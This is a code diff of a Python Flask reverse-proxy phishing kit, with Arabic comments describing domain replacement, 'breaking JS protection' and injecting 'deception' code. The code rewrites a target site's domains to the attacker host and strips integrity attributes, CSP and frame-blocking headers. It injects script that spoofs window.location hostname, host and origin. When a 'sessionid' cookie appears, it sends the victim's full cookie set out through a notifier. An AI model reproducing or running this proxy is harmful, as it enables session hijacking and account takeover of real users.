@@ -20,16 +20,13 @@ class X:
         except: pass
 
     def s(self, t, h):
-        # استبدال النطاقات
         for d in self.p:
             t = t.replace(f"https://{d}", f"https://{h}")
             t = t.replace(f"//{d}", f"//{h}")
-        # كسر حماية الـ JS
         t = re.sub(r'integrity="[^"]+"', '', t)
         t = t.replace('Content-Security-Policy', 'X-CSP')
-        # حقن كود الخداع العظيم
         if '<head>' in t:
-            j = f"<script>Object.defineProperty(window.location,'hostname',{{get:()=>'{self.d}'}});Object.defineProperty(window.location,'host',{{get:()=>'{self.d}'}});</script>"
+            j = f"<script>Object.defineProperty(window.location,'hostname',{{get:()=>'{self.d}'}});Object.defineProperty(window.location,'host',{{get:()=>'{self.d}'}});Object.defineProperty(window.location,'origin',{{get:()=>'https://{self.d}'}});</script>"
             t = t.replace('<head>', f'<head>{j}')
         return t
 
@@ -51,7 +48,6 @@ def g(p):
 
     try:
         r = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=20)
-        
         b = r.content
         if any(x in r.headers.get('Content-Type', '') for x in ['html', 'javascript', 'json']):
             try: b = e.s(b.decode('utf-8', errors='ignore'), h).encode()
@@ -59,21 +55,16 @@ def g(p):
 
         o = make_response(b)
         o.status_code = r.status_code
-
         for k, v in r.headers.items():
             if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'x-frame-options']:
                 o.headers[k] = v
-
         for k, v in r.cookies.items():
             o.set_cookie(k, v, domain=h, secure=True, httponly=True, samesite='Lax')
-
         if 'sessionid' in r.cookies:
             e.n(f"🔥 <b>Session:</b>\n<code>{json.dumps(r.cookies.get_dict())}</code>")
-
         if r.status_code in [301, 302, 303, 307, 308]:
             l = r.headers.get('Location', '').replace(e.d, h)
             o.headers['Location'] = l
-
         return o
     except: return "Error", 503
 
